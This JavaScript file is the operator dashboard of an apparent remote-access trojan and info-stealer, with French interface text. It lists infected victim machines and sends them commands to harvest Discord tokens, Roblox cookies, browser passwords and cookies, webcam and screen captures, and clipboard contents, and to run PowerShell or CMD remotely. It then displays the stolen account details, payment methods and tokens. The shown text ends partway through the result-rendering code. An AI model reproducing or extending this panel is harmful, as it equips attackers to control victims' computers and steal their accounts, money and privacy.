let currentClient = null;
let clientsData = [];
let processingTimer = null;
let commandStartTime = null;
let currentCommandId = null;
let abortController = null;
let cancelRequested = false;
let fileExplorerCache = {};
let fileExplorerHistory = [];
let fileExplorerCurrentPath = null;
let processSort = { field: null, asc: true };
let currentDisplayedCommand = null;
let isOnline = true;

const REFRESH_TIMEOUT = 60; // 1 minute timeout for refresh polling

const commandDisplayNames = {
    ping: 'Ping', system_info: 'Systeme', discord_data: 'Discord',
    roblox_cookie: 'Roblox', browser_passwords: 'Mots de passe',
    browser_cookies: 'Cookies', screenshot: 'Capture d\'ecran',
    screenshot_webcam: 'Webcam', clipboard: 'Presse-papier',
    list_processes: 'Processus', file_explorer: 'Explorateur fichiers',
    execute_ps: 'PowerShell', execute_cmd: 'CMD',
    download_file: 'Telechargement', upload_file: 'Upload'
};

// ========== FA ICONS FOR DISCORD INFO ==========
const infoIcons = {
    userId: '<span class="info-icon"><i class="fas fa-user"></i></span>',
    email: '<span class="info-icon"><i class="fas fa-envelope"></i></span>',
    phone: '<span class="info-icon"><i class="fas fa-phone"></i></span>',
    friends: '<span class="info-icon"><i class="fas fa-users"></i></span>',
    guilds: '<span class="info-icon"><i class="fas fa-server"></i></span>',
    mfa: '<span class="info-icon"><i class="fas fa-lock"></i></span>',
    flags: '<span class="info-icon"><i class="fas fa-flag"></i></span>',
    locale: '<span class="info-icon"><i class="fas fa-globe"></i></span>',
    verified: '<span class="info-icon"><i class="fas fa-check-circle"></i></span>',
    nitro: '<span class="info-icon"><i class="fas fa-gem" style="color:#f0a24a;"></i></span>',
    boost: '<span class="info-icon"><i class="fas fa-bolt" style="color:#e74c3c;"></i></span>',
    payment: '<span class="info-icon"><i class="fas fa-credit-card"></i></span>',
    token: '<span class="info-icon"><i class="fas fa-key"></i></span>',
    admin: '<span class="info-icon"><i class="fas fa-shield-alt"></i></span>'
};

// Browser SVG logos
const browserLogos = {
    'Chrome': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="4.5" fill="#fff"/>
        <path d="M12 7.5a4.5 4.5 0 1 1 0 9 4.5 4.5 0 0 1 0-9z" fill="#4285F4"/>
        <path d="M12 7.5h9.18A10.5 10.5 0 0 0 3.1 8.25L7.65 16.05A4.5 4.5 0 0 1 12 7.5z" fill="#EA4335"/>
        <path d="M21.18 7.5H12a4.5 4.5 0 0 1 3.9 6.75l4.35 7.5A10.5 10.5 0 0 0 21.18 7.5z" fill="#FBBC05"/>
        <path d="M12 16.5a4.5 4.5 0 0 1-3.9-6.75L3.76 2.23A10.5 10.5 0 0 0 20.25 21.75L15.9 14.25A4.5 4.5 0 0 1 12 16.5z" fill="#34A853"/>
    </svg>`,
    'Firefox': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#FF9500"/>
        <path d="M12 2C7.58 2 4 5.58 4 10c0 1.85.63 3.55 1.67 4.92C6.8 9.6 10.1 6.5 14 6.5c1.1 0 2 .3 2.8.8C15.1 5.2 13.6 4 12 4c-.7 0-1.4.1-2 .3C11 2.1 12 2 12 2z" fill="#FF0039"/>
        <circle cx="12" cy="13" r="6" fill="#0060DF"/>
        <path d="M6.3 10.5C6.1 11 6 11.5 6 12c0 3.31 2.69 6 6 6s6-2.69 6-6c0-.5-.07-1-.2-1.5C16.5 13.5 14.4 15 12 15s-4.5-1.5-5.7-4.5z" fill="#FF9500"/>
    </svg>`,
    'Edge': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <defs><linearGradient id="eg1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0078D4"/><stop offset="100%" stop-color="#00B4F0"/></linearGradient>
        <linearGradient id="eg2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#00B4F0"/><stop offset="100%" stop-color="#00D8A3"/></linearGradient></defs>
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="url(#eg1)"/>
        <path d="M18 10c0 3.31-2.69 6-6 6-1.5 0-2.87-.55-3.9-1.46C9.36 17.26 12 19 15 19c3.5 0 6-2.91 6-6.5 0-1-.22-1.95-.6-2.8C20 10.41 19 10 18 10z" fill="url(#eg2)"/>
        <path d="M6 12c0-3.31 2.69-6 6-6 1 0 1.95.25 2.78.69C13.27 5.26 12 5 10.5 5 7 5 4 7.91 4 12c0 1 .22 1.95.6 2.8.52.3 1.13.2 1.4-.3C6 13.7 6 12.86 6 12z" fill="#fff" opacity="0.4"/>
    </svg>`,
    'Brave': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L3.5 6v6c0 4.5 3.7 8.7 8.5 10 4.8-1.3 8.5-5.5 8.5-10V6L12 2z" fill="#FB542B"/>
        <path d="M15.5 9.5l-1-1-1 1-1.5-1.5-1.5 1.5-1-1-1 1L9 11l1 1-1 1 1.5 1.5 1 1 1-1 1 1 1-1 1.5-1.5-1-1 1-1-1.5-1.5z" fill="#fff"/>
    </svg>`,
    'Opera': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#FF1B2D"/>
        <ellipse cx="12" cy="12" rx="5" ry="7.5" fill="#fff"/>
        <ellipse cx="12" cy="12" rx="3" ry="7.5" fill="#FF1B2D"/>
    </svg>`,
    'Opera GX': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#FF1B2D"/>
        <ellipse cx="12" cy="12" rx="5" ry="7.5" fill="#fff"/>
        <ellipse cx="12" cy="12" rx="3" ry="7.5" fill="#FF1B2D"/>
        <path d="M2 12h20M2 8h20M2 16h20" stroke="#00D4FF" stroke-width="0.5" opacity="0.6"/>
    </svg>`,
    'Unknown': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#4a4f65"/>
        <text x="12" y="16" text-anchor="middle" font-size="12" fill="#fff">?</text>
    </svg>`
};

// Payment method SVG logos
const paymentLogos = {
    CreditCard: `<svg width="32" height="22" viewBox="0 0 32 22" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="1" y="1" width="30" height="20" rx="3" fill="#1a1f3a" stroke="#3b82f6" stroke-width="1"/>
        <rect x="1" y="6" width="30" height="4" fill="#3b82f6" opacity="0.8"/>
        <rect x="4" y="14" width="8" height="2" rx="0.5" fill="#64748b"/>
        <rect x="14" y="14" width="5" height="2" rx="0.5" fill="#64748b"/>
        <circle cx="25" cy="16" r="2.5" fill="#f59e0b" opacity="0.7"/>
        <circle cx="27.5" cy="16" r="2.5" fill="#ef4444" opacity="0.5"/>
    </svg>`,
    PayPal: `<svg width="32" height="22" viewBox="0 0 32 22" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="1" y="1" width="30" height="20" rx="3" fill="#f5f7fa" stroke="#d1d5db" stroke-width="0.5"/>
        <path d="M12 5h5c2.5 0 3.5 1.5 3.2 3.5-.3 2-1.8 3.5-4.2 3.5h-2.5l-.8 4H11l1-5zm3.5 4.5c1 0 1.7-.5 1.8-1.5.1-.7-.3-1.2-1.2-1.2h-1.5l-.5 2.7h1.4z" fill="#003087"/>
        <path d="M14.5 5h5c2.5 0 3.5 1.5 3.2 3.5-.3 2-1.8 3.5-4.2 3.5h-2.5l-.8 4H13.5l1-5zm3.5 4.5c1 0 1.7-.5 1.8-1.5.1-.7-.3-1.2-1.2-1.2h-1.5l-.5 2.7h1.4z" fill="#0070e0" opacity="0.6"/>
    </svg>`
};

// ========== OFFLINE DETECTION ==========
function updateConnectionStatus() {
    const online = navigator.onLine;
    isOnline = online;
    const indicator = document.getElementById('connection-indicator');
    if (indicator) {
        if (online) {
            indicator.classList.remove('offline');
            indicator.querySelector('.conn-text').textContent = 'En ligne';
            indicator.title = 'En ligne';
        } else {
            indicator.classList.add('offline');
            indicator.querySelector('.conn-text').textContent = 'Hors ligne';
            indicator.title = 'Hors ligne';
        }
    }
    document.querySelectorAll('.client-card:not(.offline)').forEach(card => {
        if (!online) {
            card.style.opacity = '0.4';
            card.style.pointerEvents = 'none';
        } else {
            card.style.opacity = '';
            card.style.pointerEvents = '';
        }
    });
}

window.addEventListener('online', updateConnectionStatus);
window.addEventListener('offline', updateConnectionStatus);

// ========== NAVIGATION ==========
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', (e) => {
        e.preventDefault();
        document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
        item.classList.add('active');
        const page = item.dataset.page;
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(`${page}-page`).classList.add('active');
        document.getElementById('page-title').innerText = item.innerText.trim();
        if (page === 'clients') loadClients();
    });
});

function refreshAll() {
    if (!isOnline) return;
    const btn = document.getElementById('refresh-btn');
    const icon = btn.querySelector('i');
    icon.classList.add('refresh-spinning');

    Promise.all([
        loadStats(),
        loadRecentClients(),
        document.getElementById('clients-page').classList.contains('active') ? loadClients() : Promise.resolve()
    ]).finally(() => {
        icon.classList.remove('refresh-spinning');
    });
}

// ========== STATS ==========
async function loadStats() {
    try {
        const res = await fetch('/api/stats');
        const stats = await res.json();
        document.getElementById('total-clients').innerText = stats.total_clients;
        document.getElementById('online-clients').innerText = stats.online_clients;
        document.getElementById('pending-commands').innerText = stats.pending_commands;
        document.getElementById('executed-commands').innerText = stats.executed_commands;
    } catch(e) { console.error(e); }
}

// ========== RECENT CLIENTS (DASHBOARD) ==========
async function loadRecentClients() {
    try {
        const res = await fetch('/api/clients');
        const clients = await res.json();
        clientsData = clients;
        renderRecentClients(clients.slice(0, 8));
    } catch(e) { console.error(e); }
}

function renderRecentClients(clients) {
    const container = document.getElementById('recent-clients');
    if (!clients.length) {
        container.innerHTML = '<div class="no-data">Aucun client connecte</div>';
        return;
    }
    container.innerHTML = clients.map(client => `
        <div class="recent-client-row">
            <div class="recent-client-left">
                <span class="recent-client-dot ${client.online ? 'online' : 'offline'}"></span>
                <span class="recent-client-name">${escapeHtml(client.computer_name || client.machine_id)}</span>
                <span class="recent-client-meta">${escapeHtml(client.username || '')}</span>
            </div>
            <div class="recent-client-right">
                <span class="recent-client-ip">${escapeHtml(client.ip || '?')}</span>
                <span class="recent-client-time">${formatDate(client.last_seen)}</span>
            </div>
        </div>
    `).join('');
}

// ========== CLIENTS ==========
async function loadClients() {
    try {
        const res = await fetch('/api/clients');
        const clients = await res.json();
        clientsData = clients;
        renderClients(clients);
    } catch(e) { console.error(e); }
}

function formatBytes(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(Math.max(bytes, 1)) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function renderClients(clients) {
    const container = document.getElementById('clients-grid');
    if (!clients.length) {
        container.innerHTML = '<div class="no-data">Aucun client connecte</div>';
        return;
    }
    container.innerHTML = clients.map(client => {
        const diskTotal = client.disk_total || 0;
        const diskUsed = diskTotal - (client.disk_free || 0);
        const ramTotal = client.ram_total || 0;
        const ramUsed = ramTotal - (client.ram_available || 0);
        const lastUpdate = client.last_update ? formatDate(client.last_update) : 'Inconnue';
        return `
        <div class="client-card ${client.online ? 'online' : 'offline'}" ${client.online ? `onclick="openCommandModal('${client.machine_id}', '${escapeHtml(client.computer_name || client.machine_id)}')"` : ''}>
            <div class="client-header">
                <div class="client-name">${escapeHtml(client.computer_name || client.machine_id)}</div>
                <div class="client-status ${client.online ? 'online' : 'offline'}">${client.online ? 'Online' : 'Offline'}</div>
            </div>
            <div class="client-details">
                <div class="client-detail-row"><i class="fas fa-user"></i> ${escapeHtml(client.username || '?')}</div>
                <div class="client-detail-row"><i class="fab fa-windows"></i> ${escapeHtml(client.windows_version || '?')}</div>
                <div class="client-detail-row"><i class="fas fa-globe"></i> ${escapeHtml(client.ip || '?')}</div>
                <div class="client-detail-row"><i class="fas fa-hdd"></i> ${formatBytes(diskUsed)} / ${formatBytes(diskTotal)}</div>
                <div class="client-detail-row"><i class="fas fa-memory"></i> ${formatBytes(ramUsed)} / ${formatBytes(ramTotal)}</div>
                <div class="client-detail-row"><i class="fas fa-sync-alt"></i> Last Update: ${lastUpdate}</div>
                <div class="client-detail-row"><i class="far fa-clock"></i> ${formatDate(client.last_seen)}</div>
            </div>
        </div>`;
    }).join('');
    updateConnectionStatus();
}

function filterClients() {
    const s = document.getElementById('client-search').value.toLowerCase();
    const filtered = clientsData.filter(c =>
        (c.computer_name||'').toLowerCase().includes(s) ||
        (c.username||'').toLowerCase().includes(s) ||
        (c.ip||'').includes(s)
    );
    renderClients(filtered);
}

function formatDate(d) {
    if (!d) return 'Jamais';
    try {
        const date = new Date(d);
        const now = new Date();
        const diff = Math.floor((now - date) / 60000);
        if (diff < 1) return 'A l\'instant';
        if (diff < 60) return `Il y a ${diff} min`;
        if (diff < 1440) return `Il y a ${Math.floor(diff/60)}h`;
        return date.toLocaleDateString();
    } catch(e) { return d; }
}

// ========== ESCAPING ==========
function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/[&<>`"]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','`':'&#96;','"':'&quot;'})[m]);
}
function escapeAttr(str) {
    if (!str) return '';
    return str.replace(/[&<>`"\\]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','`':'&#96;','"':'&quot;','\\':'\\\\'})[m]);
}

// ========== COMMAND MODAL ==========
function openCommandModal(machineId, clientName) {
    if (!isOnline) return;
    currentClient = machineId;
    document.getElementById('modal-client-name').innerText = clientName;
    document.getElementById('command-modal').style.display = 'flex';
    document.getElementById('command-params-group').style.display = 'none';
    document.getElementById('command-params').value = '';
    document.getElementById('command-type').value = 'ping';
    const trigger = document.getElementById('command-type-trigger');
    const textSpan = trigger.querySelector('.selected-text');
    textSpan.innerHTML = '<i class="fas fa-heartbeat" style="color:var(--red);"></i> Ping';
}

// ========== DROPDOWN CUSTOM ==========
(function initCustomSelect() {
    const trigger = document.getElementById('command-type-trigger');
    const optionsContainer = document.getElementById('command-type-options');
    const hiddenInput = document.getElementById('command-type');
    const textSpan = trigger.querySelector('.selected-text');

    trigger.addEventListener('click', (e) => {
        e.stopPropagation();
        optionsContainer.classList.toggle('open');
    });

    optionsContainer.querySelectorAll('.custom-option').forEach(option => {
        option.addEventListener('click', () => {
            const value = option.dataset.value;
            hiddenInput.value = value;
            const iconEl = option.querySelector('i');
            if (iconEl) {
                const clone = iconEl.cloneNode(true);
                textSpan.innerHTML = '';
                textSpan.appendChild(clone);
                textSpan.appendChild(document.createTextNode(' ' + option.textContent.trim()));
            }
            optionsContainer.classList.remove('open');
            handleCommandTypeChange(value);
        });
    });

    document.addEventListener('click', () => {
        optionsContainer.classList.remove('open');
    });
})();

function handleCommandTypeChange(value) {
    const g = document.getElementById('command-params-group');
    const textarea = document.getElementById('command-params');
    if (['execute_ps', 'execute_cmd', 'download_file', 'upload_file', 'file_explorer', 'kill_process'].includes(value)) {
        g.style.display = 'block';
        switch(value) {
            case 'execute_ps': textarea.value = 'Get-Process | Select-Object -First 10'; break;
            case 'execute_cmd': textarea.value = 'dir'; break;
            case 'file_explorer': textarea.value = 'C:\\Users'; break;
            case 'download_file': textarea.value = 'C:\\Users\\Public\\example.txt'; break;
            case 'upload_file': textarea.value = '{"path": "C:\\test.txt", "data": "base64..."}'; break;
            default: textarea.value = '';
        }
    } else {
        g.style.display = 'none';
    }
}

// ========== EXECUTION DE COMMANDE ==========
async function executeCommand() {
    if (!isOnline) { showNotification('error', 'Vous etes hors ligne'); return; }

    clearInterval(processingTimer);
    if (abortController) { abortController.abort(); abortController = null; }

    const commandType = document.getElementById('command-type').value;
    let params = {};

    if (commandType === 'execute_ps' || commandType === 'execute_cmd') {
        params = { command: document.getElementById('command-params').value };
    } else if (commandType === 'kill_process') {
        const pid = prompt('PID :');
        if (pid) params = { pid: parseInt(pid) };
    } else if (commandType === 'file_explorer') {
        let path = document.getElementById('command-params').value;
        if (path) { path = path.replace(/\\\\/g, '\\'); params = { path: path }; }
    } else if (commandType === 'download_file') {
        let path = document.getElementById('command-params').value;
        if (path) { path = path.replace(/\\\\/g, '\\'); params = { path: path }; }
    } else if (commandType === 'upload_file') {
        try { params = JSON.parse(document.getElementById('command-params').value); }
        catch (e) { alert('Format JSON invalide'); return; }
    }

    currentDisplayedCommand = { type: commandType, params: params };
    commandStartTime = Date.now();
    cancelRequested = false;
    abortController = new AbortController();

    try {
        const res = await fetch('/api/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ machine_id: currentClient, command_type: commandType, params: params }),
            signal: abortController.signal
        });
        const data = await res.json();
        if (data.command_id) {
            currentCommandId = data.command_id;
            closeModal();
            showProcessing(data.command_id, commandStartTime);
        } else {
            alert('Erreur : ' + (data.error || 'inconnue'));
        }
    } catch (e) {
        if (e.name === 'AbortError') { console.log('Commande annulee'); }
        else { alert('Erreur reseau'); }
    }
}

// ========== PROCESSING ==========
function showProcessing(commandId, startTime) {
    cancelRequested = false;
    document.getElementById('processing-modal').style.display = 'flex';
    document.getElementById('cancel-btn').style.display = 'inline-flex';
    let s = 0;
    document.getElementById('processing-timer').innerText = '0s';
    clearInterval(processingTimer);
    processingTimer = setInterval(() => {
        s++;
        document.getElementById('processing-timer').innerText = s + 's';
    }, 1000);
    waitForResult(commandId, 0, startTime);
}

async function waitForResult(commandId, attempts = 0, startTime) {
    if (cancelRequested) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; return; }
    if (attempts > 30) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; alert('Timeout'); return; }
    try {
        abortController = new AbortController();
        const res = await fetch(`/api/command_result/${commandId}`, { signal: abortController.signal });
        if (cancelRequested) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; return; }
        const data = await res.json();
        if (data.status === 'executed') {
            if (cancelRequested) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; return; }
            clearInterval(processingTimer);
            document.getElementById('processing-modal').style.display = 'none';
            document.getElementById('cancel-btn').style.display = 'none';
            showResult(data.result, data.command_type, startTime);
        } else {
            setTimeout(() => waitForResult(commandId, attempts + 1, startTime), 2000);
        }
    } catch (e) {
        if (e.name === 'AbortError') { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; }
        else { if (!cancelRequested) setTimeout(() => waitForResult(commandId, attempts + 1, startTime), 2000); }
    }
}

function cancelCommand() {
    cancelRequested = true;
    if (abortController) { abortController.abort(); abortController = null; }
    clearInterval(processingTimer);
    document.getElementById('processing-modal').style.display = 'none';
    document.getElementById('cancel-btn').style.display = 'none';
    currentCommandId = null;
}

// ========== NOTIFICATIONS ==========
function showNotification(type, message, duration = 4000) {
    const container = document.getElementById('notification-container');
    const colors = { success: 'var(--green)', error: 'var(--red)', info: 'var(--accent)', download: 'var(--amber)' };
    const icons = { success: 'fa-check-circle', error: 'fa-exclamation-circle', info: 'fa-info-circle', download: 'fa-download' };
    const notif = document.createElement('div');
    notif.className = 'notification';
    notif.style.borderLeftColor = colors[type] || colors.info;
    notif.innerHTML = `
        <i class="fas ${icons[type] || icons.info}"></i>
        <span>${message}</span>
        <div class="notification-bar" style="animation: notificationShrink ${duration}ms linear forwards;"></div>
    `;
    container.appendChild(notif);
    requestAnimationFrame(() => { notif.classList.add('show'); });
    setTimeout(() => {
        notif.classList.remove('show');
        setTimeout(() => { if (notif.parentNode) notif.parentNode.removeChild(notif); }, 300);
    }, duration);
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showNotification('success', 'Copie dans le presse-papier');
    }).catch(() => {
        const textarea = document.createElement('textarea'); textarea.value = text;
        document.body.appendChild(textarea); textarea.select();
        document.execCommand('copy'); document.body.removeChild(textarea);
        showNotification('success', 'Copie');
    });
}

// ========== REFRESH CURRENT RESULT (1 MINUTE TIMEOUT) ==========
async function refreshCurrentResult() {
    if (!currentDisplayedCommand || !currentClient || !isOnline) return;
    const btn = document.getElementById('refresh-cmd-btn');
    const icon = btn?.querySelector('i');
    if (icon) icon.classList.add('refresh-spinning');
    const startTime = Date.now();
    try {
        const res = await fetch('/api/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ machine_id: currentClient, command_type: currentDisplayedCommand.type, params: currentDisplayedCommand.params || {} })
        });
        const data = await res.json();
        if (data.command_id) {
            const result = await pollCommandResult(data.command_id, REFRESH_TIMEOUT);
            if (result) {
                showResult(result, currentDisplayedCommand.type, startTime);
                showNotification('success', 'Donnees actualisees');
            } else {
                showNotification('error', 'Echec de l\'actualisation - timeout (1 min)');
            }
        }
    } catch(e) { showNotification('error', 'Erreur reseau'); }
    finally { if (icon) icon.classList.remove('refresh-spinning'); }
}

// ========== SHOW RESULT ==========
function showResult(result, commandType, startTime) {
    const content = document.getElementById('result-content');
    const title = document.getElementById('result-title');
    content.innerHTML = '';

    const pingMs = startTime ? Date.now() - startTime : 0;
    const displayName = commandDisplayNames[commandType] || commandType;

    const titleIcons = {
        ping: 'fas fa-heartbeat', system_info: 'fas fa-info-circle', discord_data: 'fab fa-discord',
        roblox_cookie: 'fas fa-gamepad', browser_passwords: 'fas fa-key', browser_cookies: 'fas fa-cookie-bite',
        screenshot: 'fas fa-camera', screenshot_webcam: 'fas fa-video', clipboard: 'fas fa-copy',
        list_processes: 'fas fa-list', file_explorer: 'fas fa-folder-open', download_file: 'fas fa-download',
        upload_file: 'fas fa-upload', execute_ps: 'fas fa-code', execute_cmd: 'fas fa-terminal'
    };
    const titleIconColors = {
        ping: 'var(--green)', system_info: 'var(--accent)', discord_data: '#5865F2',
        roblox_cookie: 'var(--green)', browser_passwords: 'var(--amber)', browser_cookies: '#D2691E',
        screenshot: '#8b8fa5', screenshot_webcam: '#8b8fa5', clipboard: '#8b8fa5',
        list_processes: '#8b8fa5', file_explorer: 'var(--amber)', download_file: 'var(--amber)',
        upload_file: 'var(--amber)', execute_ps: '#8b8fa5', execute_cmd: '#8b8fa5'
    };

    const iconClass = titleIcons[commandType] || 'fas fa-check-circle';
    const iconColor = titleIconColors[commandType] || 'var(--accent)';
    title.innerHTML = `<i class="${iconClass}" style="color:${iconColor};"></i> ${displayName}`;

    // ALL command types get a refresh button
    title.innerHTML += ` <button class="btn btn-icon-only refresh-btn" onclick="refreshCurrentResult()" title="Rafraichir" id="refresh-cmd-btn">
        <i class="fas fa-sync-alt"></i>
    </button>`;

    if (commandType === 'ping') {
        content.innerHTML = `<div class="card-result ping-result">
            <i class="fas fa-heartbeat" style="font-size:48px;color:var(--green);"></i>
            <p style="margin-top:12px;color:var(--text-secondary);">Latence</p>
            <strong>${pingMs} ms</strong></div>`;
    }
    else if (commandType === 'system_info') {
        const r = result;
        const diskUsed = (r.disk?.total||0) - (r.disk?.free||0);
        const ramUsed = (r.ram?.total||0) - (r.ram?.available||0);
        const gpuList = Array.isArray(r.gpu) ? r.gpu : [r.gpu || 'Unknown'];
        const motherboard = r.motherboard || {};
        const antivirus = Array.isArray(r.antivirus) ? r.antivirus : [r.antivirus || 'Aucun'];
        content.innerHTML = `<div class="card-result"><h3>${escapeHtml(r.computer_name)}</h3><div class="sys-grid">
            <div class="sys-item"><span class="sys-label">Utilisateur</span><span>${escapeHtml(r.username)}</span></div>
            <div class="sys-item"><span class="sys-label">Windows</span><span>${escapeHtml(r.windows_version)}</span></div>
            <div class="sys-item"><span class="sys-label">Cle Windows</span><span class="sys-mono">${escapeHtml(r.windows_key || 'N/A')}</span></div>
            <div class="sys-item"><span class="sys-label">HWID</span><span class="sys-mono">${escapeHtml(r.hwid || 'N/A')}</span></div>
            <div class="sys-item"><span class="sys-label">IP Publique</span><span>${escapeHtml(r.ip_public || r.ip || 'N/A')}</span></div>
            <div class="sys-item"><span class="sys-label">IPv4</span><span>${(r.ipv4 || []).join(', ') || 'N/A'}</span></div>
            <div class="sys-item"><span class="sys-label">IPv6</span><span>${(r.ipv6 || []).join(', ') || 'N/A'}</span></div>
            <div class="sys-item"><span class="sys-label">MAC</span><span class="sys-mono">${escapeHtml(r.mac_address || 'N/A')}</span></div>
            <div class="sys-item"><span class="sys-label">CPU</span><span>${escapeHtml(r.cpu || 'N/A')}</span></div>
            <div class="sys-item"><span class="sys-label">GPU</span><span>${gpuList.map(g => escapeHtml(g)).join('<br>')}</span></div>
            <div class="sys-item"><span class="sys-label">Carte mere</span><span>${escapeHtml(motherboard.manufacturer)} ${escapeHtml(motherboard.product)}</span></div>
            <div class="sys-item"><span class="sys-label">BIOS</span><span>${escapeHtml(r.bios_version || 'N/A')}</span></div>
            <div class="sys-item"><span class="sys-label">Navigateur</span><span>${escapeHtml(r.default_browser || 'N/A')}</span></div>
            <div class="sys-item"><span class="sys-label">Antivirus</span><span>${antivirus.map(a => escapeHtml(a)).join('<br>')}</span></div>
            <div class="sys-item"><span class="sys-label">Disque</span><span>${formatBytes(diskUsed)} / ${formatBytes(r.disk?.total||0)}</span></div>
            <div class="sys-item"><span class="sys-label">RAM</span><span>${formatBytes(ramUsed)} / ${formatBytes(r.ram?.total||0)}</span></div>
        </div></div>`;
    }
    // Discord - with FA icons for each info type
    else if (commandType === 'discord_data') {
        if (!result || result.length === 0) {
            content.innerHTML = '<p style="color:var(--text-muted);text-align:center;padding:40px;">Aucun token Discord trouve.</p>';
        } else {
            let html = '<div class="discord-grid">';
            result.forEach(t => {
                const avatar = t.avatar_url || `https://cdn.discordapp.com/embed/avatars/${parseInt(t.discriminator||'0')%5}.png`;
                let adminGuildsHtml = '';
                if (t.admin_guilds && t.admin_guilds.length > 0) {
                    adminGuildsHtml = `<div class="admin-guilds"><p class="section-label">${infoIcons.admin} Admin Permissions:</p><ul class="guild-list">
                        ${t.admin_guilds.map(g => `<li>${escapeHtml(g.name)}: ${g.member_count || '?'}${g.vanity ? ` ; .gg/${g.vanity}` : ''}</li>`).join('')}
                    </ul></div>`;
                } else {
                    adminGuildsHtml = '<div class="admin-guilds"><p class="section-label">Admin Permissions:</p><p class="no-guilds">No guilds</p></div>';
                }

                let paymentHtml = '';
                if (t.payment_methods && t.payment_methods.length > 0) {
                    const logosHtml = t.payment_methods.map(p => {
                        const logoSvg = paymentLogos[p.type] || '';
                        const invalidClass = p.invalid ? ' invalid' : '';
                        const typeName = p.type === 'CreditCard' ? 'Carte de credit' : p.type;
                        return `<div class="payment-logo${invalidClass}">${logoSvg}<span class="payment-tooltip">${typeName}${p.invalid ? ' (invalide)' : ''}</span></div>`;
                    }).join('');
                    paymentHtml = `<div class="divider"></div><div class="payment-info"><p class="section-label">${infoIcons.payment} Payment Methods:</p>
                        <p>Montant: ${t.payment_methods.length} | Valides: ${t.valid_payment_methods || 0}</p>
                        <div class="payment-logos">${logosHtml}</div></div>`;
                }

                html += `<div class="discord-card">
                    <img src="${avatar}" class="discord-avatar" onerror="this.onerror=null;this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                    <div class="discord-info">
                        <h3>${escapeHtml(t.username)}#${t.discriminator}</h3>
                        <p>${infoIcons.userId} <span class="info-label">User ID:</span> ${t.user_id}</p>
                        <p>${infoIcons.email} <span class="info-label">Email:</span> ${t.email || 'None'}</p>
                        <p>${infoIcons.phone} <span class="info-label">Phone:</span> ${t.phone || 'None'}</p>
                        <p>${infoIcons.friends} <span class="info-label">Friends:</span> ${t.friends_count || 0}</p>
                        <p>${infoIcons.guilds} <span class="info-label">Guilds:</span> ${t.guilds_count || 0}</p>
                        <div class="divider"></div>
                        ${adminGuildsHtml}
                        <p>${infoIcons.mfa} <span class="info-label">MFA:</span> ${t.mfa_enabled ? 'True' : 'False'}</p>
                        <p>${infoIcons.flags} <span class="info-label">Flags:</span> ${t.flags || 0}</p>
                        <p>${infoIcons.locale} <span class="info-label">Locale:</span> ${t.locale || 'Unknown'}</p>
                        <p>${infoIcons.verified} <span class="info-label">Verified:</span> ${t.verified ? 'True' : 'False'}</p>
                        <div class="divider"></div>
                        <div class="nitro-info"><p class="section-label">${infoIcons.nitro} Nitro:</p>
                            <p>Has Nitro: ${t.has_nitro ? 'True' : 'False'}</p>
                            ${t.has_nitro ? `<p>Expiration: ${t.nitro_expiry || 'Unknown'}</p>` : ''}
                            <p>${infoIcons.boost} Boosts: ${t.available_boosts || 0}</p></div>
                        ${paymentHtml}
                        <div class="divider"></div>
                        <p class="section-label">${infoIcons.token} Token:</p>
                        <div class="token-box">${escapeHtml(t.token)}</div>
                    </div></div>`;
            });
            html += '</div>';
            content.innerHTML = html;
        }
    }
    // Roblox
    else if (commandType === 'roblox_cookie') {
        if (result && result.cookie) {
            content.innerHTML = `<div class="card-result">
                <h3><i class="fas fa-gamepad" style="color:var(--green);"></i> Cookie Roblox</h3>
                <p style="margin-top:12px;">Utilisateur: <strong>${escapeHtml(result.username || 'Inconnu')}</strong></p>
                <div class="token-box">${escapeHtml(result.cookie)}</div>
                <button class="copy-btn" onclick="copyToClipboard('${escapeAttr(result.cookie)}')"><i class="fas fa-copy"></i> Copier</button></div>`;
        } else {
            content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);text-align:center;">Aucun cookie Roblox trouve.</p></div>';
        }
    }
